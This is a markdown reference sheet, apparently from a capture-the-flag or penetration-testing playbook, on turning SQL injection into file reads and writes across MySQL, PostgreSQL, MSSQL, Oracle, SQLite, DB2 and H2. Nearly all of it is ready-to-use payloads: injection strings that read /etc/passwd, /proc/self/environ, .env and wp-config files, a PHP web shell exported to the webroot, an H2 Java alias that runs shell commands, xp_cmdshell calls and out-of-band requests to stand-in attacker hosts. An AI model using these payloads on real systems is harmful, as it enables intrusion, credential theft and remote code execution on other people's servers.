# File operations — read/write primitives per DBMS

Read-first, write-second. A read primitive confirms privileges,
locates the app (config files, source, webroot paths), and often
finds the flag file directly — no shell needed. Write primitives
turn that into code execution when a flag file isn't reachable.

Full write/exec detail lives in `rce-paths.md`; this file is the
read-heavy twin plus the "where is the webroot" playbook.

---

## 0. The gate questions

```sql
-- who is the DB session?
SELECT user();                -- MySQL
SELECT current_user;          -- PG
SELECT SYSTEM_USER;           -- MSSQL
SELECT user FROM dual;        -- Oracle

-- privilege checks
SELECT file_priv FROM mysql.user WHERE user=current_user;   -- MySQL FILE
SELECT current_setting('is_superuser');                      -- PG
SELECT pg_has_role(current_user,'pg_read_server_files','member');
SELECT IS_SRVROLEMEMBER('sysadmin');                         -- MSSQL
SELECT privilege FROM session_privs WHERE privilege LIKE '%FILE%';  -- Oracle
```

If the session can't read files, skip to `oob.md` — the file
channel isn't there.

---

## 1. MySQL / MariaDB — LOAD_FILE

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/flag');
SELECT LOAD_FILE('/flag.txt');
SELECT LOAD_FILE('C:/Windows/win.ini');
SELECT LOAD_FILE('\\\\attacker\\share\\x');      -- UNC → SMB OOB too!
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
' UNION SELECT NULL,LOAD_FILE('/var/www/html/index.php')-- -
```

Gates:

- FILE privilege required (except via LOCAL tricks — see below).
- `secure_file_priv`: `NULL` = LOAD_FILE disabled entirely;
  `''` = anywhere; `/dir/` = only inside that dir:

  ```sql
  SHOW VARIABLES LIKE 'secure_file_priv';
  SELECT @@secure_file_priv;
  ```

- Returns NULL on: no priv, file missing, unreadable, >max_allowed_
  packet, secure_file_priv violation. NULL ≠ file absent.

Encoding/binary issues:

```sql
SELECT hex(LOAD_FILE('/bin/ls'));                -- binary → hex
SELECT base64(to_base64(LOAD_FILE('/x')));        -- → base64
SELECT LOAD_FILE('/path') INTO OUTFILE '/tmp/y';  -- copy within limits
SELECT SUBSTRING(LOAD_FILE('/big'),1,4096);        -- chunked read
SELECT SUBSTRING(LOAD_FILE('/big'),4097,4096);     -- next chunk
```

`LOAD DATA [LOCAL] INFILE` — the file-import statement:

```sql
-- server-side read into a table (FILE priv):
CREATE TABLE t(x LONGTEXT);
LOAD DATA INFILE '/etc/passwd' INTO TABLE t
   LINES TERMINATED BY '\n';
SELECT * FROM t;

-- LOCAL variant: file comes from the CLIENT — with a rogue server
-- it's an attack on mysql CLIENTS, not useful through injection
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t;
```

`INTO OUTFILE`/`DUMPFILE` — write side, full detail `rce-paths.md` §2:

```sql
SELECT 'x' INTO OUTFILE '/tmp/t.txt';
SELECT 0xDEADBEEF INTO DUMPFILE '/tmp/t.bin';
```

---

## 2. PostgreSQL

### pg_read_file — the direct read (superuser or pg_read_server_files)

```sql
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/etc/passwd', 0, 1000000);      -- offset,length
SELECT pg_read_file('/flag');
' UNION SELECT pg_read_file('/etc/passwd'),NULL-- -
' UNION SELECT NULL,pg_read_file('/proc/self/environ')-- -
```

`pg_read_binary_file` for binary:

```sql
SELECT encode(pg_read_binary_file('/bin/ls'), 'base64');
SELECT pg_read_binary_file('/x', 0, 4096);
SELECT encode(pg_read_binary_file('/proc/self/mem'),'hex'); -- careful
```

### COPY FROM file — server-side import (superuser / pg_read_server_files)

```sql
CREATE TABLE t(x text);
COPY t FROM '/etc/passwd';
SELECT * FROM t;
COPY t FROM '/flag' WITH (FORMAT text);
```

### lo_import / lo_export — the LOW-PRIV path

`pg_largeobject` insert needs only table privileges — this is the
sqlmap file-read path for non-superusers:

```sql
SELECT lo_import('/etc/passwd');           -- returns loid
SELECT lo_get(481516);                      -- oid → bytea
SELECT encode(lo_get(481516),'escape');    -- bytea → text
SELECT lo_export(481516,'/tmp/x');          -- write server-side
```

Convert loid → content when UNION-visible:

```sql
' UNION SELECT encode(lo_get(lo_import('/etc/passwd')),'escape')-- -
   -- lo_import returns the loid INSIDE the same query — chains
' UNION SELECT encode((SELECT data FROM pg_largeobject WHERE
   loid=lo_import('/etc/passwd') LIMIT 1),'escape')-- -
```

### Large-object write → export to webroot

```sql
SELECT lo_create(31337);
INSERT INTO pg_largeobject(loid,pageno,data)
   VALUES(31337,0,decode('<?php system($_GET["c"]);?>','escape'));
SELECT lo_export(31337,'/var/www/html/s.php');
```

`pg_ls_dir` — directory LISTING (superuser/pg_read_server_files):

```sql
SELECT pg_ls_dir('/var/www/html');
SELECT pg_ls_dir('/');
SELECT pg_ls_dir('/proc/self/fd');
SELECT pg_ls_logdir();                       -- log files
SELECT pg_stat_file('/etc/passwd');           -- exists + size + mtime
SELECT pg_ls_waldir();
```

`pg_stat_file` is the free "does this path exist" oracle — works as
boolean in blind contexts.

---

## 3. MSSQL

### OPENROWSET BULK — read

```sql
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) x;
SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config',
   SINGLE_NCLOB) x;
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\flag.txt', SINGLE_CLOB) x;
' UNION SELECT BulkColumn,NULL FROM
   OPENROWSET(BULK 'C:\flag.txt', SINGLE_CLOB) x-- -
```

SINGLE_BLOB for binary; SINGLE_NCLOB for unicode text.

### BULK INSERT — file → table

```sql
CREATE TABLE t(x nvarchar(max));
BULK INSERT t FROM 'C:\flag.txt';
SELECT * FROM t;
BULK INSERT t FROM 'C:\inetpub\logs\iis.log';
```

### xp_cmdshell — read via exec (rce-paths §4)

```sql
EXEC xp_cmdshell 'type C:\flag.txt';
EXEC xp_cmdshell 'powershell -c "gc C:\flag.txt"';
```

### xp_dirtree — directory listing (often enabled when xp_cmdshell isn't)

```sql
EXEC master..xp_dirtree 'C:\';
EXEC master..xp_dirtree 'C:\inetpub\wwwroot';
EXEC master..xp_subdirs 'C:\';                 -- dirs only
EXEC master..xp_fileexist 'C:\flag.txt';        -- exists oracle → rowcount
```

### sp_OA file IO

```sql
DECLARE @f int,@s nvarchar(4000);
EXEC sp_OACreate 'Scripting.FileSystemObject',@f OUT;
EXEC sp_OAMethod @f,'OpenTextFile',@o OUT,'C:\flag.txt',1;
EXEC sp_OAMethod @o,'ReadAll',@s OUT;
SELECT @s;
```

---

## 4. Oracle

### UTL_FILE — file read/write (needs directory object + grant)

```sql
-- directory objects you can use:
SELECT directory_name,directory_path FROM all_directories;
SELECT directory_name FROM user_directories;

DECLARE f UTL_FILE.FILE_TYPE; b VARCHAR2(4000); BEGIN
   f := UTL_FILE.FOPEN('DIR_NAME','flag.txt','R');
   UTL_FILE.GET_LINE(f,b);
   DBMS_OUTPUT.PUT_LINE(b);
   UTL_FILE.FCLOSE(f); END;
-- inline (returns first line in an error or UNION):
SELECT UTL_FILE.FOPEN('DIR','x.txt','R') FROM dual;
```

### Oracle directory tricks that echo content

```sql
-- external tables read a file as rows:
CREATE TABLE x(t varchar2(4000))
   ORGANIZATION EXTERNAL (TYPE oracle_loader DEFAULT DIRECTORY dir
   ACCESS PARAMETERS(RECORDS DELIMITED BY NEWLINE FIELDS(t))
   LOCATION('flag.txt'));
SELECT * FROM x;

-- ctxsys.text indexes read documents (old trick, still works):
exec ctxsys.ctx_ddl.create_preference('x','FILE_DATASTORE');
```

### UTL_HTTP / HTTPURITYPE — fetch files over HTTP INTO oracle

```sql
SELECT UTL_HTTP.REQUEST('http://me/') FROM dual;        -- OOB AND fetch
SELECT HTTPURITYPE('file:///etc/passwd').getclob() FROM dual;
SELECT HTTPURITYPE('http://me/x').getclob() FROM dual;
```

`HTTPURITYPE('file://...')` is the sleeper — some builds let it
deref local files.

---

## 5. SQLite — extension functions only

```sql
SELECT readfile('/etc/passwd');            -- CLI-extension fn
SELECT CAST(readfile('/flag') AS text);
SELECT hex(readfile('/bin/ls'));
SELECT writefile('/tmp/x',hexblob('41'));   -- write side
SELECT edit('/etc/passwd');                 -- read variant
```

Probe availability via `pragma_function_list` (`sqlite.md` §6).
When absent: `ATTACH` + `CREATE TABLE` is the only "file" primitive
—and it writes, not reads.

---

## 6. DB2

```sql
SELECT * FROM TABLE(SNAP_GET_FILE('/etc/passwd')) t;      -- admin view
CALL SYSPROC.ADMIN_CMD('LOAD FROM /etc/passwd OF DEL INSERT INTO t');
-- XML trick: xmlcolumn reads files in some configs
SELECT XMLPARSE(DOCUMENT xmllink-content FROM '/etc/passwd') FROM
   sysibm.sysdummy1;
-- older: CREATE EXTERNAL TABLE via LIBRARY functions
```

DB2 `IMPORT`/`LOAD`/`EXPORT` need SYSADM; `ADMIN_READ_FILE` table
function exists on some builds — probe `SYSCAT.FUNCTIONS`.

---

## 7. H2 (Java-embedded, common in CTF java apps)

```sql
-- file read:
SELECT FILE_READ('/etc/passwd');                          -- needs FILE_READ
SELECT * FROM CSVREAD('/etc/passwd');                     -- csv format
SELECT * FROM CSVREAD('/etc/passwd', 'line');             -- one col
-- write/exec:
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd)
   throws java.io.IOException { java.util.Scanner s = new
   java.util.Scanner(Runtime.getRuntime().exec(cmd)
   .getInputStream()).useDelimiter("\\A"); return
   s.hasNext() ? s.next() : ""; }$$;
CALL SHELLEXEC('id');
-- LINK_SCHEMA / CREATE LINKED TABLE — connect out:
CREATE LINKED TABLE t(NULL,'org.h2.Driver','jdbc:h2:mem:x','u','p','SELECT 1');
```

H2's `CREATE ALIAS` with inline Java is THE CTF-known H2→RCE chain
— file_read + CREATE ALIAS + CALL = full exec in one stacked shot.

---

## 8. Path discovery — where the webroot/config lives

```sql
-- MySQL
SELECT @@datadir,@@basedir,@@tmpdir,@@secure_file_priv;
SELECT LOAD_FILE('/etc/apache2/apache2.conf');
SELECT LOAD_FILE('/etc/nginx/nginx.conf');
SELECT LOAD_FILE('/var/www/html/.htaccess');
SELECT LOAD_FILE('/proc/self/cwd/index.php');
SELECT LOAD_FILE('/proc/self/environ');

-- PG
SHOW data_directory; SHOW config_file; SHOW hba_file;
SELECT pg_ls_dir('/var/www/html');
SELECT pg_read_file('/proc/self/cmdline');

-- MSSQL
EXEC master..xp_dirtree 'C:\inetpub\wwwroot';
EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',
   'SYSTEM\CurrentControlSet\Services\W3SVC','MajorVersion';
SELECT SERVERPROPERTY('InstanceDefaultDataPath');

-- Oracle
SELECT name,value FROM v$parameter WHERE name LIKE '%directory%';
SELECT directory_path FROM all_directories;

-- SQLite
SELECT file FROM pragma_database_list;      -- the db file path itself
```

The high-value read targets (in order):

```text
/flag  /flag.txt  /root/flag  /home/*/flag        CTF defaults
/var/www/html/.env  .env  config.php  wp-config.php
/proc/self/environ          env vars = secrets sometimes
/proc/self/cmdline          how the app launched
/etc/passwd                 users to spray
apache/nginx confs          webroot + rewrite rules
web.config                  IIS app settings (conn strings!)
id_rsa / authorized_keys    ssh pivots (rare)
access/error logs           request breadcrumbs
```

---

## 9. Reading through blind channels

File reads inside blind queries — same binary search, on the file
content:

```sql
-- MySQL boolean
' AND ASCII(SUBSTRING(LOAD_FILE('/flag'),1,1))>100-- -
' AND LOAD_FILE('/flag') LIKE 'f%'-- -
' AND LENGTH(LOAD_FILE('/flag'))>20-- -

-- MySQL time
' AND IF(LOAD_FILE('/flag') LIKE 'f%',SLEEP(3),0)-- -

-- PG
' AND substring(pg_read_file('/flag'),1,1)='f'-- -
' AND (SELECT pg_read_file('/flag') LIKE 'flag{%')-- -

-- MSSQL
' AND (SELECT BulkColumn FROM OPENROWSET(BULK 'C:\flag.txt',
   SINGLE_CLOB) x) LIKE 'f%'-- -

-- error echo (fastest when it works)
' AND extractvalue(1,concat(0x7e,LOAD_FILE('/flag')))-- -
' AND CAST((SELECT BulkColumn FROM OPENROWSET(BULK 'C:\flag.txt',
   SINGLE_CLOB) x) AS int)-- -
```

File-EXISTS as boolean (no read priv needed):

```sql
-- MySQL: LOAD_FILE returns NULL on missing — can't distinguish
-- priv-fail vs missing; instead use:
' AND (SELECT COUNT(*) FROM mysql.user WHERE
   user=LOAD_FILE('/flag'))>=0-- -           -- weird but valid oracle
-- PG: pg_stat_file errors on missing → error-oracle:
' AND (SELECT pg_stat_file('/flag')) IS NOT NULL-- -
-- MSSQL: xp_fileexist returns table:
' AND EXISTS(SELECT 1 FROM
   OPENROWSET(BULK 'C:\flag.txt',SINGLE_CLOB) x)-- -  -- errors vs empty
```

---

## 10. The write targets that matter

```text
/var/www/html/             php/apache default
/srv/http/                 arch-style nginx
/usr/share/nginx/html/     nginx packages
/var/www/*/public/         multi-site
/var/www/app/public/       laravel/symfony
C:\inetpub\wwwroot\        IIS
/opt/tomcat/webapps/ROOT/  java
/app/public/               dockerized node/php
```

If you can't find the webroot:

```sql
SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf');
SELECT LOAD_FILE('/etc/nginx/conf.d/default.conf');
SELECT pg_ls_dir('/var/www');
EXEC master..xp_dirtree 'C:\inetpub';
```

---

## 11. Checklist

```text
[ ] session user/privs named (FILE, superuser, sysadmin, directory)
[ ] secure_file_priv / write-jail value read
[ ] webroot path established (read a config if unsure)
[ ] read primitive confirmed on /etc/passwd or known file
[ ] binary-safe path chosen (hex/base64/encode) for non-text
[ ] chunked reads for large files (SUBSTRING/offset/length)
[ ] write target = file that executes (.php/.jsp/.aspx/.shtml/.cgi)
[ ] written file fetched back to confirm
[ ] no write/exec path → OOB (oob.md) or stay blind
```
